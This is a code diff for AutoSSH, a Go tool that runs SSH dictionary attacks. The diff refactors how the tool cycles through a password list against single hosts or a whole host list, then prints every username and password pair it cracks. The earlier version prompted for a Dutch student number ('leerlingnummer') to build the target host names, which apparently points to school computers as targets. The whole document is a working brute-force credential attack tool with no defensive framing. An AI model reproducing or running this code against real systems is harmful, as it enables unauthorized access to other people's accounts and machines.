@@ -10,98 +10,130 @@ import (
 	"github.com/cfschilham/autossh/internal/sshconn"
 )
 
-const (
-	authErr1 = "ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain"
-	authErr2 = "ssh: handshake failed: ssh: unable to authenticate, attempted methods [password none], no supported methods remain"
-	authErr3 = "ssh: handshake failed: ssh: unable to authenticate, attempted methods [none], no supported methods remain"
-)
+var authErrs = []string{
+	"ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain",
+	"ssh: handshake failed: ssh: unable to authenticate, attempted methods [password none], no supported methods remain",
+	"ssh: handshake failed: ssh: unable to authenticate, attempted methods [none], no supported methods remain",
+}
 
-// dictAttack attempts to connect to the given hostname with all passwords in dict.Pwds() unless it
-// encounters err != nil nor authErr1, authErr2 or authErr3. In this case it stops cycling though
-// dict.Pwds() immediately.
-func dictAttack(hostname string, dict *loadcfg.Dict, verbose bool) {
-	if !verbose {
-		fmt.Printf("Attempting to connect to '%s'\n", hostname+"@"+hostname+".local:22")
+// inStrSlc returns true when s is the same as an entry of slc
+func inStrSlc(str string, slc []string) bool {
+	for _, entry := range slc {
+		if entry == str {
+			return true
+		}
 	}
+	return false
+}
 
-	// Start looping through dictionary passwords
+// dictAttack attempts to establish an SSH connection with the given parameters and returns a
+// non-empty password string in case of a successful connection. An empty string means an unsuccessful
+// authentication.
+func dictAttack(h loadcfg.Host, dict *loadcfg.Dict, port string, verbose bool) (string, error) {
 	for _, pwd := range dict.Pwds() {
 		if verbose {
-			fmt.Printf("Attempting to establish SSH connection at '%s' using password '%s'\n", hostname+"@"+hostname+".local:22", pwd)
+			fmt.Printf("Trying to connect with password '%s'\n", pwd)
 		}
-
-		if err := sshconn.SSHConn(hostname+".local:22", hostname, pwd, ""); err != nil {
-			switch err.Error() {
-			case authErr1:
-				if verbose {
-					log.Println(err.Error())
-				}
-			case authErr2:
-				if verbose {
-					log.Println(err.Error())
-				}
-			case authErr3:
-				if verbose {
-					log.Println(err.Error())
-				}
-			default:
-				log.Println("failed to connect: " + err.Error())
-				return
+		if err := sshconn.SSHConn(h.IP(), h.Username(), port, pwd); err != nil {
+			// If the non-nil error is not an auth error an error is returned, otherwise we simply move on to the next pwd in dict.Pwds()
+			if !inStrSlc(err.Error(), authErrs) {
+				return "", err
+			}
+			if verbose {
+				log.Println(err.Error())
 			}
 		} else {
-			fmt.Println("Connection successfully established!")
-			fmt.Printf("Host: '%s' | Pass: '%s'\n", hostname+"@"+hostname+".local", pwd)
-			return
+			return pwd, nil
 		}
 	}
-
-	if !verbose {
-		fmt.Println("Authentication with dictionary failed")
-	}
+	return "", nil
 }
 
 func main() {
-	fmt.Println("AutoSSH v0.2.2 - https://github.com/cfschilham/autossh")
+	fmt.Println("AutoSSH v1.0.0 - https://github.com/cfschilham/autossh")
 
 	fmt.Println("Loading cfg/config.yml...")
 	config, err := loadcfg.LoadConfig()
 	if err != nil {
-		log.Fatalln(err)
+		log.Fatalln(err.Error())
 	}
 
 	fmt.Printf("Loading %s...\n", config.DictPath())
 	dict, err := loadcfg.LoadDict(config.DictPath())
 	if err != nil {
-		log.Fatalln(err)
+		log.Fatalln(err.Error())
 	}
 
 	switch config.Mode() {
 	case "manual":
-		var hostname string
 		for {
-			fmt.Print("Leerlingnummer (type 'exit' to exit): ")
-			fmt.Scanln(&hostname)
-			if hostname == "exit" {
+			if config.UsrIsHost() {
+				fmt.Println("You currently have 'user_is_host' enabled in cfg/config.yml. This means\nip adresses are inferred, meaning you only have to enter the username. Read config for details.")
+			} else {
+				fmt.Println("Example input: 'john@johns-pc.local', peter@192.168.1.2")
+			}
+
+			var input string
+			fmt.Print("Enter host (type 'exit' to exit): ")
+			fmt.Scanln(&input)
+
+			if input == "exit" {
 				os.Exit(0)
 			}
-			dictAttack(hostname, dict, config.Verbose())
-		}
 
+			h, err := loadcfg.StrToHost(input, config.UsrIsHost())
+			if err != nil {
+				log.Println(err.Error())
+				continue
+			}
+
+			fmt.Printf("Attempting to connect to '%s@%s'...\n", h.Username(), h.IP())
+			pwd, err := dictAttack(h, dict, config.Port(), config.Verbose())
+			if err != nil {
+				log.Fatalln(err.Error())
+			}
+			if pwd != "" {
+				fmt.Printf("Password of '%s' found: %s\n", h.Username()+"@"+h.IP(), pwd)
+			} else {
+				fmt.Printf("Unable to find password of '%s'\n", h.Username()+"@"+h.IP())
+			}
+		}
 	case "hostlist":
 		fmt.Printf("Loading %s...\n", config.HostlistPath())
-		hostlist, err := loadcfg.LoadHostlist(config.HostlistPath())
+		hl, err := loadcfg.LoadHostlist(config.HostlistPath(), config.UsrIsHost())
 		if err != nil {
-			log.Fatalln(err)
+			log.Fatalln(err.Error())
 		}
 
-		for i, hostname := range hostlist.Hosts() {
-			fmt.Printf("Host list %d%% complete\n", int(math.Round(float64(i)/float64(len(hostlist.Hosts()))*100)))
-			dictAttack(hostname, dict, config.Verbose())
+		var hostPwdCombos = map[string]string{}
+		for i, h := range hl.Hosts() {
+			fmt.Printf("%d%% done\n", int(math.Round(float64(i)/float64(len(hl.Hosts()))*100)))
+			fmt.Printf("Attempting to connect to '%s@%s'...\n", h.Username(), h.IP())
+			pwd, err := dictAttack(h, dict, config.Port(), config.Verbose())
+			if err != nil {
+				log.Println(err.Error())
+			}
+
+			if pwd != "" {
+				hostPwdCombos[h.Username()+"@"+h.IP()] = pwd
+				fmt.Printf("Password of '%s' found: %s\n", h.Username()+"@"+h.IP(), pwd)
+			} else {
+				fmt.Printf("Unable to find password of '%s'\n", h.Username()+"@"+h.IP())
+			}
 		}
-		fmt.Println("Host list 100% complete, press enter to exit...")
+
+		if len(hostPwdCombos) > 0 {
+			fmt.Println("The following combinations were found: ")
+			for host, pwd := range hostPwdCombos {
+				fmt.Printf("Host: '%s' | Password: '%s'\n", host, pwd)
+			}
+		} else {
+			fmt.Println("No combinations were found")
+		}
+
+		fmt.Println("Press enter to exit...")
 		fmt.Scanln()
-
 	default:
-		log.Fatalf("cfg/config.yml: mode '%s' does not exist!", config.Mode())
+		log.Fatalf("cfg/config.yml: '%s' is not a valid mode", config.Mode())
 	}
 }
